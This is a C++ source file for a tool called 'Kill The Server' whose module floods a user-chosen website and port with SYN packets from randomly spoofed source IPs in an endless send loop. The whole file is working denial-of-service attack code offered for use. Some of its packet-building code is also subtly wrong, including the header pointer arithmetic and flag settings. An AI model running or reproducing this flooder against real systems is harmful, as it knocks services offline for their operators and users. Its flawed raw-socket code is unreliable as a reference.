/*

	Kill The Server v 0.1
	Copyright (c)Luca Magistrelli 2011

	This program is free software: you can redistribute it and/or modify
    	it under the terms of the GNU General Public License as published by
    	the Free Software Foundation, either version 3 of the License, or
    	(at your option) any later version.

    	This program is distributed in the hope that it will be useful,
    	but WITHOUT ANY WARRANTY; without even the implied warranty of
    	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    	GNU General Public License for more details.

    	You should have received a copy of the GNU General Public License
    	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/




#include <iostream>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <cstdlib>

#include "synattack.h"
#include "utils.h"

#define TH_FIN 0x02

using namespace std;

struct ipheader {
 unsigned char      iph_ihl:5, iph_ver:4;
 unsigned char      iph_tos;
 unsigned short int iph_len;
 unsigned short int iph_ident;
 unsigned char      iph_flags;
 unsigned short int iph_offset;
 unsigned char      iph_ttl;
 unsigned char      iph_protocol;
 unsigned short int iph_chksum;
 unsigned int       iph_sourceip;
 unsigned int       iph_destip;
};

/* Structure of the TCP header */

struct tcpheader {
 unsigned short int   tcph_srcport;
 unsigned short int   tcph_destport;
 unsigned int         tcph_seqnum;
 unsigned int         tcph_acknum;
 unsigned char        tcph_reserved:4, tcph_offset:4;
 unsigned int         tcp_res1:4, tcph_hlen:4, tcph_fin:1, tcph_syn:1, tcph_rst:1, tcph_psh:1, tcph_ack:1,  tcph_urg:1,  tcph_res2:2;
 unsigned short int   tcph_win;
 unsigned short int   tcph_chksum;
 unsigned short int   tcph_urgptr;
};

unsigned short csum (unsigned short *buf, int nwords)
{

  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void SynFlood(string target, int port)
{
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096];
    char *gen_ip = GenRandomIp();
    struct ipheader *iph = (struct ipheader *) datagram;
    struct tcpheader *tcph = (struct tcpheader *) datagram + sizeof (struct ipheader);
    struct sockaddr_in sin;
    unsigned int floodport = port;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(target.c_str ());
    memset(datagram, 0, 4096);
    iph->iph_ihl = 5;
    iph->iph_ver = 4;
    iph->iph_tos = 0;
    iph->iph_len = sizeof (struct ipheader) + sizeof (struct tcpheader);
    iph->iph_ident = htonl (54321);
    iph->iph_offset = 0;
    iph->iph_ttl = 255;
    iph->iph_protocol = 6;
    iph->iph_chksum = 0;
    iph->iph_sourceip = inet_addr (gen_ip);
    iph->iph_destip = sin.sin_addr.s_addr;
    tcph->tcph_srcport = htons (5678);
    tcph->tcph_destport = htons (floodport);
    /* in a SYN packet, the sequence is a random */
    tcph->tcph_seqnum = random();
    tcph->tcph_acknum = 0;
    tcph->tcph_res2 = 0;
    tcph->tcph_offset = 0;
    tcph->tcph_syn = TH_FIN;
    tcph->tcph_win = htonl (65535);
    tcph->tcph_chksum = 0;
    tcph-> tcph_urgptr = 0;
    iph-> iph_chksum = csum ((unsigned short *) datagram, iph-> iph_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
    {
        cout << "[Error]Cannot set HDRINCL!" << endl;
        return;
    }
    while(1)
    {
        if(sendto(s,datagram, iph->iph_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
            cout << "[Error] coudn't send the packet" << endl;;
    }
}

//standard module
void SynFloodAttackInit()
{
    string target="", ip="";
    int port=0;
    cout << "Insert the site(eg www.google.com): " << endl;
    cin >> target;
    cout << "insert the target port(eg. 80): " << endl;
    cin >> port;
    ip = resolveSite(target);
    if(ip == "")
        return;
    //start the attack
    cout << "#########Target Info#########" << endl;
    cout << "Site: " << target << endl;
    cout << "Ip: " << ip << endl;
    cout << "Port: " << port << endl;
    cout << "#############################" << endl;
    cout << "[INFO]Starting the attack..." << endl;
    SynFlood(ip, port);
}
